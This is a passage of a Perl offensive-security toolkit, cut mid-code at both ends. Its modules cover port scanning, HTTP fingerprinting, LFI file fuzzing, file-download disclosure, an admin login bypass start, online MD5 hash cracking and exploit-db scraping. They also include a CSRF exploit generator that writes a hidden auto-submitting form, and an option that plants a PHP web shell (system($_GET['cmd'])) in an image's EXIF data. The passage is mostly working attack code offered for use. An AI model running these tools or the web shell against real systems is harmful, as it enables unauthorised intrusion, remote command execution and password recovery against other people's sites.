        printear( "\n[+] Enter in the database\n", "text", "13", "5" );

        while (1) {

            my $ac = printear( "\n[+] Query : ", "stdin", "11", "13" );

            if ( $ac eq "exit" ) {
                $enter->disconnect;
                printear( "\n[+] Closing connection\n", "text", "5", "5" );
                adios();
            }

            $re = $enter->prepare($ac);
            $re->execute();
            my $total = $re->rows();

            my @columnas = @{ $re->{NAME} };

            if ( $total eq "-1" ) {
                printear( "\n[-] Query Error\n", "text", "5", "5" );
                next;
            }
            else {
                printear( "\n[+] Result of the query\n", "text", "13", "5" );
                if ( $total eq 0 ) {
                    printear( "\n[+] Not rows returned\n", "text", "5", "5" );
                }
                else {
                    printear(
                        "\n[+] Rows returned : " . $total . "\n\n", "text",
                        "13",                                       "5"
                    );
                    for (@columnas) {
                        printear( $_ . "\t\t", "text", "7", "5" );
                    }
                    print "\n";
                    while ( @row = $re->fetchrow_array ) {
                        for (@row) {
                            printear( $_ . "\t\t", "text", "7", "5" );
                        }
                        print "\n";
                    }
                }
            }
        }
    }
    else {
        print "\n[-] Error connecting\n";
    }

##

    adios();

}

sub head_exploitdb {
    printear( "



 @@@@@ @     @ @@@@@  @      @@@@   @  @@@@@     @@@@    @@@@ 
 @     @     @ @    @ @     @    @  @    @       @   @   @   @
 @      @   @  @    @ @     @    @  @    @       @    @  @   @
 @       @ @   @    @ @     @    @  @    @       @    @  @   @
 @@@@     @    @@@@@  @     @    @  @    @       @    @  @@@@ 
 @       @ @   @      @     @    @  @    @       @    @  @   @
 @      @   @  @      @     @    @  @    @       @    @  @   @
 @     @     @ @      @     @    @  @    @       @   @   @   @
 @@@@@ @     @ @      @@@@@  @@@@   @    @       @@@@    @@@@ 


                                              
", "logos", "7", "5" );
}

sub exploitdb {

    clean();
    head_exploitdb();

    my $cosa = printear( "[+] String : ", "stdin", "11", "13" );

    if ( $cosa eq "" ) { adios(); }
    printear( "\n[+] Searching string\n", "text", "13", "5" );
    my %found = buscar($cosa);
    $total = int( keys %found ) - 1;
    printear( "\n[+] Exploits Found : " . $total . "\n\n", "text", "13", "5" );
    unless ( -d $cosa ) {
        mkdir( "logs/exploitdb/" . $cosa, "0777" );
    }
    for my $da ( keys %found ) {
        my $tata = $da;
        $tata =~ s/=//ig;
        $tata =~ s/\(//ig;
        $tata =~ s/\)//ig;
        $tata =~ s/\///ig;
        $tata =~ s/_//ig;
        $tata =~ s/\<//ig;
        $tata =~ s/(\s)+$//;

        if (
            download(
                $found{$da}, "logs/exploitdb/" . $cosa . "/" . $tata . ".txt"
            )
          )
        {
            printear( "[Exploit Found] : " . $da . "\n", "text", "7", "5" );
            chmod 0777, "logs/exploitdb/" . $cosa . "/" . $tata . ".txt";
        }

    }

    chmod 0777, "logs/exploitdb/" . $cosa;

    printear( "\n[+] Finished\n", "text", "13", "5" );

    adios();

    sub buscar {
        for my $n ( 1 .. 666 ) {
            my $code = toma(
                "http://www.exploit-db.com/search/?action=search&filter_page="
                  . $n
                  . "&filter_description="
                  . $_[0]
                  . "&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve="
            );
            chomp $code;
            if ( $code =~ /No results/ig ) {
                return %busca;
            }
            %busca = getlinks($code);
        }
    }

    sub getlinks {

        my $test = HTML::Parser->new(
            start_h => [ \&start, "tagname,attr" ],
            text_h  => [ \&text,  "dtext" ],
        );
        $test->parse( $_[0] );

        sub start {
            my ( $a, $b ) = @_;
            my %e = %$b;
            unless ( $a ne "a" ) {
                $d = $e{href};
                $c = $a;
            }
        }

        sub text {
            my $title = shift;
            chomp $title;
            unless ( $c ne "a" ) {
                if ( $d =~ /www.exploit-db.com\/exploits\/(.*)/ ) {
                    my $id  = $1;
                    my $url = "http://www.exploit-db.com/download/" . $id;
                    $links{$title} = $url;
                }
                $d = "";
            }
        }
        return %links;
    }

}

sub head_encodedecode {
    printear( "

 @@@@@  @    @   @@@@   @@@@   @@@@    @@@@@  @@@@@ 
 @      @@   @  @    @ @    @  @   @   @      @    @
 @      @@   @  @      @    @  @    @  @      @    @
 @      @ @  @  @      @    @  @    @  @      @    @
 @@@@   @ @  @  @      @    @  @    @  @@@@   @@@@@ 
 @      @  @ @  @      @    @  @    @  @      @    @
 @      @   @@  @      @    @  @    @  @      @    @
 @      @   @@  @    @ @    @  @   @   @      @    @
 @@@@@  @    @   @@@@   @@@@   @@@@    @@@@@  @    @

                                              
", "logos", "7", "5" );
}

sub encodedecode {

    clean();
    head_encodedecode();

    printear( "
[++] Options

[+] 1 : MD5 encoder
[+] 2 : base64 encoder
[+] 3 : base64 decoder
[+] 4 : ASCII encoder
[+] 5 : ASCII decoder
[+] 6 : HEX encoder
[+] 7 : HEX decoder
[+] 8 : URL encoder
[+] 9 : URL decoder
[+] 10 : Text to BIN
[+] 11 : BIN to Text
[+] 12 : Exit

", "text", "13", "5" );

    my $op = printear( "[+] Option : ", "stdin", "11", "13" );

    if ( $op eq "1" ) {

        my $texto = printear( "\n[+] Text : ", "stdin", "11", "13" );
        printear( "\n[+] Result : " . md5_hex($texto) . "\n",
            "text", "13", "5" );
        adios();

    }
    elsif ( $op eq "2" ) {

        my $texto = printear( "\n[+] Text : ", "stdin", "11", "13" );
        printear(
            "\n[+] Result : " . encode_base64($texto) . "\n", "text",
            "13",                                             "5"
        );
        adios();

    }
    elsif ( $op eq "3" ) {

        my $texto = printear( "\n[+] Text : ", "stdin", "11", "13" );
        printear(
            "\n[+] Result : " . decode_base64($texto) . "\n", "text",
            "13",                                             "5"
        );
        adios();

    }
    if ( $op eq "4" ) {

        my $texto = printear( "\n[+] Text : ", "stdin", "11", "13" );
        printear( "\n[+] Result : " . ascii($texto) . "\n", "text", "13", "5" );
        adios();

    }
    elsif ( $op eq "5" ) {

        my $texto = printear( "\n[+] Text : ", "stdin", "11", "13" );
        printear(
            "\n[+] Result : " . ascii_de( $texto . "\n" ), "text",
            "13",                                          "5"
        );
        adios();

    }
    elsif ( $op eq "6" ) {

        my $texto = printear( "\n[+] Text : ", "stdin", "11", "13" );
        printear( "\n[+] Result : " . encode($texto) . "\n", "text", "13",
            "5" );
        adios();

    }
    elsif ( $op eq "7" ) {

        my $texto = printear( "\n[+] Text : ", "stdin", "11", "13" );
        printear( "\n[+] Result : " . decode($texto) . "\n", "text", "13",
            "5" );
        adios();

    }
    elsif ( $op eq "8" ) {

        my $texto = printear( "\n[+] Text : ", "stdin", "11", "13" );
        printear(
            "\n[+] Result : " . uri_escape($texto) . "\n", "text",
            "13",                                          "5"
        );
        adios();

    }
    elsif ( $op eq "9" ) {

        my $texto = printear( "\n[+] Text : ", "stdin", "11", "13" );
        printear(
            "\n[+] Result : " . uri_unescape($texto) . "\n", "text",
            "13",                                            "5"
        );
        adios();

    }
    elsif ( $op eq "10" ) {

        my $texto = printear( "\n[+] Text : ", "stdin", "11", "13" );
        printear(
            "\n[+] Result : " . unpack( "B*", $texto ) . "\n", "text",
            "13", "5"
        );
        adios();

    }
    elsif ( $op eq "11" ) {

        my $texto = printear( "\n[+] Text : ", "stdin", "11", "13" );
        printear(
            "\n[+] Result : " . pack( "B*", $texto ) . "\n", "text",
            "13", "5"
        );
        adios();

    }
    elsif ( $op eq "12" ) {
        adios();
    }
    else {
        adios();
    }

}

sub head_portscanner {
    printear( "
	
 @@@@@   @@@@   @@@@@   @@@@@      @@@    @@@@    @    @    @
 @    @ @    @  @    @    @       @   @  @    @   @    @@   @
 @    @ @    @  @    @    @       @      @       @ @   @@   @
 @    @ @    @  @    @    @       @      @       @ @   @ @  @
 @@@@@  @    @  @@@@@     @        @@@   @      @   @  @ @  @
 @      @    @  @    @    @           @  @      @   @  @  @ @
 @      @    @  @    @    @           @  @      @@@@@  @   @@
 @      @    @  @    @    @       @   @  @    @@     @ @   @@
 @       @@@@   @    @    @        @@@    @@@@ @     @ @    @
                                              
", "logos", "7", "5" );

}

sub portscanner {

    clean();
    head_portscanner();

    printear( "
[++] Options

[+] 1 : Simple Scan
[+] 2 : Full Scan
[+] 3 : Exit 

", "text", "13", "5" );

    my $op = printear( "[+] Option : ", "stdin", "11", "13" );

    if ( $op eq "1" ) {

        my %ports = (
            "21"   => "ftp",
            "22"   => "ssh",
            "25"   => "smtp",
            "80"   => "http",
            "110"  => "pop3",
            "3306" => "mysql"
        );

        my $ip = printear( "\n[+] IP : ", "stdin", "11", "13" );

        printear( "\n[+] Scanning $ip ...\n\n", "text", "13", "5" );

        for my $port ( keys %ports ) {

            if (
                new IO::Socket::INET(
                    PeerAddr => $ip,
                    PeerPort => $port,
                    Proto    => "tcp",
                    Timeout  => 0.5
                )
              )
            {
                printear(
                    "[Port] : " 
                      . $port
                      . " [Service] : "
                      . $ports{$port} . "\n",
                    "text", "7", "5"
                );
            }
        }

        printear( "\n[+] Finished\n", "text", "13", "5" );

        adios();

    }

    elsif ( $op eq "2" ) {

        my $ip    = printear( "\n[+] IP : ",         "stdin", "11", "13" );
        my $start = printear( "\n[+] Start Port : ", "stdin", "11", "13" );
        my $end   = printear( "\n[+] End Port : ",   "stdin", "11", "13" );

        printear( "\n[+] Scanning $ip ...\n\n", "text", "13", "5" );

        for my $port ( $start .. $end ) {
            if (
                new IO::Socket::INET(
                    Timeout  => 0.5,
                    PeerAddr => $ip,
                    PeerPort => $port,
                    Proto    => "tcp",
                    Timeout  => 0.5
                )
              )
            {
                printear( "[+] Port Found : " . $port . "\n", "text", "7",
                    "5" );
            }
        }
        printear( "\n[+] Scan Finished\n", "text", "13", "5" );

        adios();
    }

    elsif ( $op eq "3" ) {
        adios();
    }
    else {
        adios();
    }

}

sub head_httpfinger {
    printear( "
	
 @    @  @@@@@  @@@@@  @@@@@     @@@@@ @  @    @   @@@@   @@@@@  @@@@@
 @    @    @      @    @    @    @     @  @@   @  @    @  @      @    @
 @    @    @      @    @    @    @     @  @@   @  @       @      @    @
 @    @    @      @    @    @    @     @  @ @  @  @       @      @    @
 @@@@@@    @      @    @@@@@     @@@@  @  @ @  @  @  @@@  @@@@   @@@@@
 @    @    @      @    @         @     @  @  @ @  @    @  @      @    @
 @    @    @      @    @         @     @  @   @@  @    @  @      @    @
 @    @    @      @    @         @     @  @   @@  @   @@  @      @    @
 @    @    @      @    @         @     @  @    @   @@@ @  @@@@@  @    @
                                              
", "logos", "7", "5" );

}

sub httpfinger {

    clean();
    head_httpfinger();

    printear( "
[++] Options

[+] 1 : Simple Scan
[+] 2 : Full Scan
[+] 3 : Exit 

", "text", "13", "5" );

    my $op = printear( "[+] Option : ", "stdin", "11", "13" );

    if ( $op eq "1" ) {

        my $page = printear( "\n[+] Page : ", "stdin", "11", "13" );

        printear( "\n[+] Getting Data ...\n", "text", "13", "5" );

        my $code = $nave->get($page);

        printear( "\n[+] Date : " . $code->header('date'), "text", "13", "5" );
        printear( "\n[+] Server : " . $code->header('server'),
            "text", "13", "5" );
        printear( "\n[+] Connection : " . $code->header('connection'),
            "text", "13", "5" );
        printear( "\n[+] Content-Type : " . $code->header('content-type'),
            "text", "13", "5" );

        printear( "\n\n[+] Finished\n", "text", "13", "5" );

        adios();

    }
    elsif ( $op eq "2" ) {

        my $page = printear( "\n[+] Page : ", "stdin", "11", "13" );

        printear( "\n[+] Getting Data ...\n", "text", "13", "5" );

        my $code = $nave->get($page);

        printear( "\n" . $code->headers()->as_string(), "text", "13", "5" );

        printear( "\n[+] Finished\n", "text", "13", "5" );

        adios();

    }
    elsif ( $op eq "3" ) {
    }
    else {
        adios();
    }

}

sub csrf_scan {

    clean();
    head_csrf();

    my $archivo_html = printear( "[+] File HTML : ",  "stdin", "11", "13" );
    my $resultado    = printear( "\n[+] SaveFile : ", "stdin", "11", "13" );

    unless ( -f $archivo_html ) {
        printear( "\n[-] File Not Found\n", "text", "5", "5" );
        adios();
    }

    printear( "\n[+] File to parse : " . $archivo_html . "\n",
        "text", "13", "5" );

    open( FILE, $archivo_html );
    my $words = join q(), <FILE>;
    close(FILE);

    my @testar = HTML::Form->parse( $words, "/" );

    $count = 0;
    foreach my $test (@testar) {
        $count++;
        printear( "\n -- == Form $count == --\n\n", "text", "13", "5" );
        if ( $test->attr(name) eq "" ) {
            printear( "[+] Name : No Found" . "\n", "text", "13", "5" );
        }
        else {
            printear( "[+] Name : " . $test->attr(name) . "\n",
                "text", "13", "5" );
        }
        printear( "[+] Action : " . $test->action . "\n", "text", "13", "5" );
        printear( "[+] Method : " . $test->method . "\n", "text", "13", "5" );
        printear( "\n-- == Input == --\n\n",              "text", "13", "5" );
        @inputs = $test->inputs;
        printear( "Type\t\tName\t\tValue\n", "text", "13", "5" );
        foreach $in (@inputs) {
            printear( $in->type . "\t\t",    "text", "13", "5" );
            printear( $in->name . "\t\t",    "text", "13", "5" );
            printear( $in->value . "\t\t\n", "text", "13", "5" );
        }
    }

    my $op = printear( "\n\n[+] Form to generate : ", "stdin", "11", "13" );

    if ( $op ne "" ) {
        $op--;
        my $probar = ( HTML::Form->parse( $words, "/" ) )[$op];

        my $action = ver( $words, $op );
        my $fin = nombre($action) . ".html";
        savefile(
            "csrf/" . $resultado,
            "<form action=$action method=" . $probar->method . " name=exploit>"
        );
        @input = $probar->inputs;
        foreach $in (@input) {

            my $val = printear(
                "\n[+] Value of the " . $in->name . " : ", "stdin",
                "11",                                      "13"
            );

            savefile(
                "csrf/" . $resultado,
                "<input type=hidden name=" . $in->name . " value=" . $val . ">"
            );
        }
        my $final =
"</form><script language=javascript>function colocar(){document.exploit.submit()}
</script><iframe width=6% height=%6 overflow=hidden onmouseover=javascript:colocar()>
";
        savefile( "csrf/" . $resultado, $final );
        printear( "\n[+] CSRF Exploit Generated\n", "text", "13", "5" );
    }

    adios();

}

sub ver {
    my $probar = ( HTML::Form->parse( $_[0], "/" ) )[ $_[1] ];
    my $action = $probar->action;
    my $co     = $action;
    if ( $action eq "" or $action eq "/" ) {
        my $action = printear( "\n[+] Action : ", "stdin", "11", "13" );
        return $action;
    }
    else {
        return $co;
    }

}

sub head_csrf {
    printear( "
	
  @@@@   @@@   @@@@@   @@@@@    @@@@@   @@@@    @@@@   @    
 @    @ @   @  @    @  @          @    @    @  @    @  @    
 @      @      @    @  @          @    @    @  @    @  @    
 @      @      @    @  @          @    @    @  @    @  @    
 @       @@@   @@@@@   @@@@       @    @    @  @    @  @    
 @          @  @    @  @          @    @    @  @    @  @    
 @          @  @    @  @          @    @    @  @    @  @    
 @    @ @   @  @    @  @          @    @    @  @    @  @    
  @@@@   @@@   @    @  @          @     @@@@    @@@@   @@@@@


                                              
", "logos", "7", "5" );
}

sub lfi_scan {

    clean();
    head_lfi();

    printear( "
[++] Options

[+] 1 : Scan Page
[+] 2 : Generate Image Infected
[+] 3 : Exit 

", "text", "13", "5" );

    my $op = printear( "[+] Option : ", "stdin", "11", "13" );

    if ( $op eq "1" ) {

        my $page = printear( "\n[+] Page : ", "stdin", "11", "13" );

        printear( "\n[+] Scanning ...\n", "text", "13", "5" );

        $code = toma( $page . "'" );
        if (   $code =~ /No such file or directory in <b>(.*)<\/b> on line/ig
            or $code =~
            /No existe el fichero o el directorio in <b>(.*?)<\/b> on line/ig )
        {
            printear( "[+] Vulnerable !\n", "text", "13", "5" );
            printear(
                "[*] Full path discloure detected : $1\n", "text",
                "13",                                      "5"
            );
            printear( "\n[+] Status : [fuzzing files]\n\n", "text", "13", "5" );
            for my $file (@files) {
                $code1 = toma( $page . $file );
                unless ( $code1 =~
                    /No such file or directory in <b>(.*)<\/b> on line/ig
                    or $code =~
/No existe el fichero o el directorio in <b>(.*?)<\/b> on line/ig
                  )
                {
                    $ok = 1;
                    printear(
                        "[File Found] : " . $page . $file . "\n", "text",
                        "7",                                      "5"
                    );
                    savefile( "lfi_logs.txt", $page . $file );
                }
            }
            unless ( $ok == 1 ) {
                printear( "\n[-] Dont found any file\n", "text", "5", "5" );
            }
        }
        else {
            printear( "\n[-] Page not vulnerable to LFI\n", "text", "5", "5" );
        }

        adios();

    }

    elsif ( $op eq "2" ) {

        my $image = printear( "\n[+] Image : ", "stdin", "11", "13" );

        my $poc = Image::ExifTool->new();

        $poc->ExtractInfo($image);
        $poc->SetNewValue( "Model", '<?php system($_GET["cmd"]);exit(1); ?>' );

        if ( $poc->WriteInfo($image) ) {
            printear( "\n[+] Enjoy this photo\n", "text", "7", "5" );
        }
        else {
            printear( "\n[-] Error\n", "text", "5", "5" );
        }

        adios();

    }
    elsif ( $op eq "3" ) {
        adios();
    }
    else {
        adios();
    }

}

sub head_lfi {
    printear( "
	
###  ########   #####   ##    ##  ###  
 #    #  # #    # # #  #  #  #  #  #   
 #    #    #      #    #  #  #  #  #   
 #    ###  #      #    #  #  #  #  #   
 #    #    #      #    #  #  #  #  #   
 #    #    #      #    #  #  #  #  #   
########  ###    ###    ##    ##  #####
                                              
", "logos", "7", "5" );
}

sub menu_crackhash {

    head_crackhash();

    my $op = printear( "[+] Option : ", "stdin", "11", "13" );

    if ( $op eq "1" ) {
        my $ha = printear( "\n[+] Hash : ", "stdin", "11", "13" );
        if ( ver_length($ha) ) {
            printear( "\n[+] Cracking Hash...\n", "text", "13", "5" );
            my $re = crackit($ha);
            unless ( $re =~ /false01/ ) {
                printear( "\n[+] Cracked : $re\n", "text", "7", "5" );
                savefile( "hashes-found.txt", $ha . ":" . $re );
            }
            else {
                printear( "\n[-] Not Found\n\n", "text", "5", "5" );
            }
        }
        else {
            printear( "\n[-] Hash invalid\n", "text", "5", "5" );
        }
        printear( "\n[+] Press the enter key to return to main menu\n",
            "text", "13", "5" );
        <stdin>;
        menu_crackhash();
    }
    if ( $op eq "2" ) {
        my $fi = printear( "\n[+] Wordlist : ", "stdin", "11", "13" );
        if ( -f $fi ) {
            printear( "\n[+] Opening File\n", "text", "13", "5" );
            open( WORD, $fi );
            my @varios = <WORD>;
            close WORD;
            my @varios = repes(@varios);
            printear( "\n[+] Hashes Found : " . int(@varios),
                "text", "13", "5" );
            printear( "\n\n[+] Cracking hashes...\n\n", "text", "13", "5" );
            for $hash (@varios) {
                chomp $hash;
                if ( ver_length($hash) ) {
                    my $re = crackit($hash);
                    unless ( $re =~ /false01/ ) {
                        printear( "[+] $hash : $re\n", "text", "7", "5" );
                        savefile( "hashes-found.txt", $hash . ":" . $re );
                    }
                }
            }
        }
        else {
            printear( "\n[-] File Not Found\n", "text", "5", "5" );
        }
        printear( "\n[+] Press the enter key to return to main menu\n",
            "text", "13", "5" );
        <stdin>;
        menu_crackhash();
    }
    if ( $op eq "3" ) {
        adios();
    }
}

sub crackit {

    my $md5 = shift;
    my $resultado;

## www.md5.net

    my $code = tomar(
        "http://www.md5.net/cracker.php",
        { 'hash' => $md5, 'submit' => 'Crack' }
    );

    if ( $code =~ m{<input type="text" id="hash" size="(.*?)" value="(.*?)"/>}
        and $code !~ /Entry not found./mig )
    {

        $resultado = $2;

    }
    else {

## md5online.net

        my $code = tomar( "http://md5online.net/index.php",
            { 'pass' => $md5, 'option' => 'hash2text', 'send' => 'Submit' } );

        if ( $code =~
            /<center><p>md5 :<b>(.*?)<\/b> <br>pass : <b>(.*?)<\/b><\/p>/ )
        {
            $resultado = $2;
        }
        else {

## md5decryption.com

            my $code = tomar(
                "http://md5decryption.com/index.php",
                { 'hash' => $md5, 'submit' => 'Decrypt It!' }
            );

            if ( $code =~ /Decrypted Text: <\/b>(.*?)<\/font>/ ) {
                $resultado = $1;
            }
            else {

## md5.my-addr.com

                my $code = tomar(
"http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php",
                    { 'md5' => $md5 }
                );

                if ( $code =~
/<span class='middle_title'>Hashed string<\/span>: (.*?)<\/div>/
                  )
                {
                    $resultado = $1;
                }
                else {
                    $resultado = "false01";
                }
            }
        }
    }
    return $resultado;
}

sub head_crackhash {
    clean();
    printear( "


##########  #########  #########     #####   #    ###  ###
 #  # #  ##  #  #   #   #  # #  #     #  #   #   #  # #  #
 #    #  ##  #  #    #  #    #  #     #  #  # #  #    #   
 ###  #  # # #  #    #  ###  ###      ###   # #   ##   ## 
 #    #  # # #  #    #  #    # #      #    #####    #    #
 #    #  #  ##  #   #   #  # #  #     #    #   # #  # #  #
###  ######  # #####   ########  #   ###  ### ######  ### 



", "logos", "7", "5" );
    printear( "
[++] Options

[+] 1 : Hash
[+] 2 : File with hashes
[+] 3 : Exit 

", "text", "13", "5" );
}    ##

sub load_locateip {

    head_locateip();
    my $page = printear( "[+] Page : ", "stdin", "11", "13" );
    if ( $page eq "exit" ) {
        estoydentroporahora();
    }
    infocon($page);
    adios();

    sub head_locateip {
        clean();
        printear( "



 @      @@@@    @@@@    @    @@@@@  @@@@@     @  @@@@@ 
 @     @    @  @    @   @      @    @         @  @    @
 @     @    @  @       @ @     @    @         @  @    @
 @     @    @  @       @ @     @    @         @  @    @
 @     @    @  @      @   @    @    @@@@      @  @@@@@ 
 @     @    @  @      @   @    @    @         @  @     
 @     @    @  @      @@@@@    @    @         @  @     
 @     @    @  @    @@     @   @    @         @  @     
 @@@@@  @@@@    @@@@ @     @   @    @@@@@     @  @     



", "logos", "7", "5" );
    }

    sub infocon {
        my $target = shift;

        my ( $scheme, $auth, $path, $query, $frag ) = uri_split($target);

        if ( $auth ne "" ) {

            my $get    = gethostbyname($auth);
            my $target = inet_ntoa($get);

            printear( "\n[+] Getting info\n\n", "text", "13", "5" );

            $total =
"http://www.melissadata.com/lookups/iplocation.asp?ipaddress=$target";
            $re = toma($total);

            if ( $re =~ /City<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ ) {
                printear( "[+] City : $2\n", "text", "7", "5" );
            }
            else {
                printear( "[-] Not Found\n", "text", "5", "5" );
                adios();
            }
            if ( $re =~ /Country<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ ) {
                printear( "[+] Country : $2\n", "text", "7", "5" );
            }
            if ( $re =~
                /State or Region<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ )
            {
                printear( "[+] State or Region : $2\n", "text", "7", "5" );
            }

            printear( "\n[+] Getting Hosts\n\n", "text", "13", "5" );

            my $code = toma( "http://www.ip-adress.com/reverse_ip/" . $target );

            while ( $code =~ /whois\/(.*?)\">Whois/g ) {
                my $dns = $1;
                chomp $dns;
                printear( "[DNS] : $dns\n", "text", "7", "5" );
            }
        }
    }

}    ##

##

sub load_findpaths {

    head_paths();
    my $web = printear( "[+] Web : ", "stdin", "11", "13" );

    if ( $web eq "exit" ) {
        estoydentroporahora();
    }

    printear( "\n[+] Scan Type\n", "text", "5",  "5" );
    printear( "\n[+] 1 : Fast\n",  "text", "13", "5" );
    printear( "[+] 2 : Full\n",    "text", "13", "5" );
    printear( "[+] 3 : Exit\n",    "text", "13", "5" );
    my $op = printear( "\n[+] Option : ", "stdin", "11", "13" );

    if ( $op eq "3" ) {
        estoydentroporahora();
    }

    printear( "\n[+] Scanning ....\n\n", "text", "13", "5" );

    if ( $op eq "1" ) {
        simple($web);
    }
    elsif ( $op eq "2" ) {
        escalar($web);
    }
    else {
        simplex($web);
    }
    adios();

    sub escalar {

        my $co    = $_[0];
        my $code  = toma( $_[0] );
        my @links = get_links($code);

        if ( $code =~ /Index of (.*)/ig ) {
            printear( "[+] Link : $co\n", "text", "7", "5" );
            savefile( "paths-logs.txt", $co );
            my $dir_found = $1;
            chomp $dir_found;
            while ( $code =~ /<a href=\"(.*)\">(.*)<\/a>/ig ) {
                my $ruta   = $1;
                my $nombre = $2;
                unless ( $nombre =~ /Parent Directory/ig
                    or $nombre =~ /Description/ig )
                {
                    push( @encontrados, $_[0] . "/" . $nombre );
                }
            }
        }

        for my $com (@links) {
            my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );
            if ( $path =~ /\/(.*)$/ ) {
                my $path1 = $1;
                $_[0] =~ s/$path1//ig;
                my ( $scheme, $auth, $path, $query, $frag ) = uri_split($com);
                if ( $path =~ /(.*)\// ) {
                    my $parche = $1;
                    unless ( $repetidos =~ /$parche/ ) {
                        $repetidos .= " " . $parche;
                        my $yeah = "http://" . $auth . $parche;
                        escalar($yeah);
                    }
                }
                for (@encontrados) {
                    escalar($_);
                }
            }
        }
    }

    sub simplex {

        my $code  = toma( $_[0] );
        my @links = get_links($code);

        for my $com (@links) {
            my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );
            if ( $path =~ /\/(.*)$/ ) {
                my $path1 = $1;
                $_[0] =~ s/$path1//ig;
                my ( $scheme, $auth, $path, $query, $frag ) = uri_split($com);
                if ( $path =~ /(.*)\// ) {
                    my $parche = $1;
                    unless ( $repetidos =~ /$parche/ ) {
                        $repetidos .= " " . $parche;
                        my $code = toma( "http://" . $auth . $parche );

                        if ( $code =~ /Index of (.*)</ig ) {
                            my $dir_found = $1;
                            chomp $dir_found;
                            my $yeah = "http://" . $auth . $parche;
                            printear( "[+] Link : $yeah\n", "text", "7", "5" );
                            savefile( "paths-logs.txt", $yeah );
                        }
                    }
                }
            }
        }
    }

    sub head_paths {
        clean();
        printear( "


 @@@@@ @           @             @@@@@           @         
 @                 @             @    @       @  @         
 @                 @             @    @       @  @         
 @     @ @ @@   @@@@  @@@  @@    @    @  @@@  @@ @ @@   @@ 
 @@@@  @ @@  @ @   @ @   @ @     @@@@@      @ @  @@  @ @  @
 @     @ @   @ @   @ @@@@@ @     @       @@@@ @  @   @  @  
 @     @ @   @ @   @ @     @     @      @   @ @  @   @   @ 
 @     @ @   @ @   @ @   @ @     @      @   @ @  @   @ @  @
 @     @ @   @  @@@@  @@@  @     @       @@@@  @ @   @  @@ 





", "logos", "7", "5" );
    }

}    ##

sub load_fsd {

    head_fsd();

    my $page = printear( "[+] Page : ", "stdin", "11", "13" );

    if ( $page eq "exit" ) {
        estoydentroporahora();
    }

    ver_now_now($page);

    adios();

    sub ver_now_now {

        my $page = $_[0];
        my $archivo;

        if ( $page =~ /(.*)\/(.*)\?/ ) {
            $archivo = $2;
        }

        printear( "\n[+] Scanning page ...\n", "text", "13", "5" );

        my $code = toma( $page . $archivo );

        if ( $code =~ /header\((.*)Content-Disposition: attachment;/ig ) {

            printear( "\n[+] Vulnerable !\n", "text", "13", "5" );

            my $code = toma( $page . "'" );

            if ( $code =~ /No such file or directory in <b>(.*)<\/b> on line/ )
            {

                printear(
                    "\n[+] Full Source Discloure Detect : $1\a\n", "text",
                    "7",                                           "5"
                );

            }
            elsif ( $code =~
                /No existe el fichero o el directorio in <b>(.*)<\/b> on line/ )
            {
                printear(
                    "\n[+] Full Source Discloure Detect : $1\a\n", "text",
                    "7",                                           "5"
                );
            }
            else {
                printear(
                    "\n[+] Full Path Dislocure : Not Found\n", "text",
                    "7",                                       "5"
                );
            }

            while (1) {

                my $url = printear( "\n[+] URL : ", "stdin", "11", "13" );

                if ( $url eq "exit" ) {
                    adios();
                }

                if (
                    download( $page . $url, "logs/fsdlogs/" . basename($url) ) )
                {
                    printear( "\n[+] File Downloaded\n", "text", "13", "5" );

                    system_leida( "logs/fsdlogs/" . basename($url) );

                }

            }

        }
        else {
            printear( "\n[-] Web not vulnerable\n\n", "text", "5", "5" );
        }

    }

    sub head_fsd {
        clean();
        printear( "


 @@@@@  @@@   @@@@       @@@@@ @     @ @@@@@  @      @@@@   @  @@@@@
 @     @   @  @   @      @     @     @ @    @ @     @    @  @    @  
 @     @      @    @     @      @   @  @    @ @     @    @  @    @  
 @     @      @    @     @       @ @   @    @ @     @    @  @    @  
 @@@@   @@@   @    @     @@@@     @    @@@@@  @     @    @  @    @  
 @         @  @    @     @       @ @   @      @     @    @  @    @  
 @         @  @    @     @      @   @  @      @     @    @  @    @  
 @     @   @  @   @      @     @     @ @      @     @    @  @    @  
 @      @@@   @@@@       @@@@@ @     @ @      @@@@@  @@@@   @    @  




", "logos", "7", "5" );
    }

    sub download {
        if ( $nave->mirror( $_[0], $_[1] ) ) {
            if ( -f $_[1] ) {
                return true;
            }
        }
    }

    sub installer_fsd {
        unless ( -d "fsdlogs/" ) {
            mkdir( "fsdlogs/", "777" );
        }
    }

}    ##

sub load_bypass {

    head_bypass();
    start_com();
    adios();

    sub start_com {
        my $url = printear( "\n\n[+] Admin : ", "stdin", "11", "13" );

        if ( $url eq "exit" ) {
            estoydentroporahora();
        }

        print "\n[+] Scanning page ...\n";

        my $code = toma($url);

        my @testar = HTML::Form->parse( $code, "/" );

        $count = 0;
        foreach my $test (@testar) {
            $count++;
            printear( "\n -- == Form $count == --\n\n", "text", "5", "5" );
            if ( $test->attr(name) eq "" ) {
                printear( "[+] Name : No Found" . "\n", "text", "13", "5" );
            }
            else {
                printear(
                    "[+] Name : " . $test->attr(name) . "\n", "text",
                    "13",                                     "5"
                );
            }
            printear( "[+] Action : " . $test->action . "\n",
                "text", "13", "5" );
            printear( "[+] Method : " . $test->method . "\n",
                "text", "13", "5" );
            printear( "\n-- == Input == --\n", "text", "5", "5" );
            @inputs = $test->inputs;

            foreach $in (@inputs) {
                printear( "\n[+] Type : " . $in->type . "\n",
                    "text", "13", "5" );
                printear( "[+] Name : " . $in->name . "\n", "text", "13", "5" );
                printear( "[+] Value : " . $in->value . "\n",
                    "text", "13", "5" );
            }
        }

        my $op  = printear( "\n[+] Form to crack : ", "stdin", "11", "13" );
        my $aca = printear( "\n[+] Submit Name : ",   "stdin", "11", "13" );

        printear( "\n[+] Options to check\n\n", "text", "5",  "5" );
        printear( "[?] 1 - Positive\n",         "text", "13", "5" );
        printear( "[?] 2 - Negative\n",         "text", "13", "5" );
        printear( "[?] 3 - Automatic\n\n",      "text", "13", "5" );
        my $op2 = printear( "[+] Option : ", "stdin", "11", "13" );

        if ( $op2 eq "1" ) {
            my $st = printear( "\n[+] String : ", "stdin", "11", "13" );
            printear( "\n[+] Cracking login....\n", "text", "13", "5" );
            for my $by (@bypass) {
                chomp $by;
